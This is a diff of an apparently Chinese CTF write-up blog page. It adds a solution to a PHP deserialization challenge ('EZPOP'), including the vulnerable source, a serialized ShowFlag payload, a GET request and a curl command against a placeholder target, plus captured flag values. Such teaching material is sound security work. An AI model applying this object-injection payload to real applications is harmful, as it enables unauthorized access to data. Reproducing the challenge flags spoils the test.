@@ -15,7 +15,7 @@
 <meta name="twitter:description" content="前言 到最后了，/(ㄒoㄒ)/~~\nEZXSS EZXSS（存储型 XSS） 漏洞类型： 存储型 XSS（Stored Cross-Site Scripting）\n题目分析：\n目标是一个技术博客网站，包含搜索框和留言板功能。经测试：\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://blog.xxchenchen.top/img/qingcenctf-cover.svg' />
     <link rel="shortcut icon" href="/favicon.png" />
-<link rel="stylesheet" href='/css/custom.css?v=1782199529'>
+<link rel="stylesheet" href='/css/custom.css?v=1782313209'>
 
     </head>
     <body class="
@@ -327,7 +327,7 @@
     </li>
     <li><a href="#ezpop">EZPOP</a>
       <ol>
-        <li><a href="#ezpop-1">EZPOP</a></li>
+        <li><a href="#ezpop基础-php-反序列化--__destruct-魔术方法触发">EZPOP（基础 PHP 反序列化 — __destruct 魔术方法触发）</a></li>
         <li><a href="#ezpop_1">EZPOP_1</a></li>
         <li><a href="#ezpop_2">EZPOP_2</a></li>
         <li><a href="#ezpop_3">EZPOP_3</a></li>
@@ -582,7 +582,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 23 分钟
+                    阅读时长: 24 分钟
                 </time>
             </div>
         
@@ -599,7 +599,7 @@
 
 
 
-                <span class="article-time--wordcount">11342 字</span>
+                <span class="article-time--wordcount">11890 字</span>
             </div>
         
     </footer>
@@ -2505,8 +2505,99 @@
 </ol>
 <p><strong>Flag：</strong> <code>flag{183315a0-7f7a-4ef6-85d1-cc48b4126a35}</code></p>
 <h2 id="ezpop">EZPOP
-</h2><h3 id="ezpop-1">EZPOP
-</h3><h3 id="ezpop_1">EZPOP_1
+</h2><h3 id="ezpop基础-php-反序列化--__destruct-魔术方法触发">EZPOP（基础 PHP 反序列化 — __destruct 魔术方法触发）
+</h3><p><strong>漏洞类型：</strong> PHP 对象注入（POP - PHP Object Injection）— <code>unserialize()</code> + <code>__destruct</code> 魔术方法</p>
+<p><strong>题目分析：</strong></p>
+<p>页面直接展示了 PHP 源码，核心逻辑非常简单：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ShowFlag</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$show</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">show</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>关键点：</p>
+<ul>
+<li><code>$flag</code> 变量通过 <code>file_get_contents(&quot;/flag&quot;)</code> 读取 flag 文件内容，存储在全局变量 <code>$GLOBALS['flag']</code> 中</li>
+<li><code>ShowFlag</code> 类的 <code>__destruct()</code> 析构方法会在对象销毁时自动调用</li>
+<li>当 <code>$this-&gt;show</code> 为 <code>true</code> 时，<code>__destruct()</code> 会 <code>echo $GLOBALS['flag']</code> 输出 flag</li>
+<li>用户通过 <code>$_GET['data']</code> 传入的数据会直接传给 <code>unserialize()</code> 进行反序列化</li>
+</ul>
+<p><strong>攻击思路：</strong> 构造一个 <code>ShowFlag</code> 对象，将 <code>$show</code> 属性设为 <code>true</code>，序列化后通过 <code>data</code> 参数传入 → <code>unserialize()</code> 还原对象 → 脚本结束时 <code>__destruct()</code> 被触发 → <code>$show</code> 为 <code>true</code> → 输出 flag</p>
+<p><strong>Step 1：分析源码，确定利用链</strong></p>
+<p>反序列化利用链：</p>
+<ol>
+<li><code>unserialize($_GET['data'])</code> — 用户可控输入</li>
+<li>还原 <code>ShowFlag</code> 对象，<code>$show</code> 属性被设为 <code>true</code></li>
+<li>脚本执行结束，PHP 引擎销毁对象，触发 <code>__destruct()</code></li>
+<li><code>if ($this-&gt;show)</code> 条件成立，<code>echo $GLOBALS['flag']</code> 输出 flag</li>
+</ol>
+<p><strong>Step 2：构造序列化 Payload</strong></p>
+<p>在 PHP 中，序列化一个 <code>ShowFlag</code> 对象（<code>$show = true</code>）的结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:8:&#34;ShowFlag&#34;:1:{s:4:&#34;show&#34;;b:1;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>格式说明：</p>
+<ul>
+<li><code>O:8:&quot;ShowFlag&quot;</code> — 对象（Object），类名长度 8</li>
+<li><code>1</code> — 有 1 个属性</li>
+<li><code>s:4:&quot;show&quot;</code> — 字符串属性名，长度 4，值为 <code>show</code></li>
+<li><code>b:1</code> — 布尔值，<code>true</code></li>
+</ul>
+<p><strong>Step 3：提交 Payload 获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /?data=O:8:%22ShowFlag%22:1:{s:4:%22show%22;b:1;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>服务端 <code>unserialize()</code> 还原对象后，脚本结束时 <code>__destruct()</code> 自动执行。注意 flag 输出在 <code>highlight_file()</code> 生成的 HTML <code>&lt;/code&gt;</code> 标签<strong>之后</strong>（因为析构在脚本最后才触发），需要查看完整 HTTP 响应才能看到。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -G --data-urlencode <span class="s1">&#39;data=O:8:&#34;ShowFlag&#34;:1:{s:4:&#34;show&#34;;b:1;}&#39;</span> <span class="s2">&#34;http://target/&#34;</span> <span class="p">|</span> grep -oP <span class="s1">&#39;flag\{[^}]+\}&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Flag：</strong> <code>flag{f94fa85e-7281-44de-ab33-fd8c99662f0a}</code></p>
+<h3 id="ezpop_1">EZPOP_1
 </h3><h3 id="ezpop_2">EZPOP_2
 </h3><h3 id="ezpop_3">EZPOP_3
 </h3><h3 id="ezpop_4">EZPOP_4
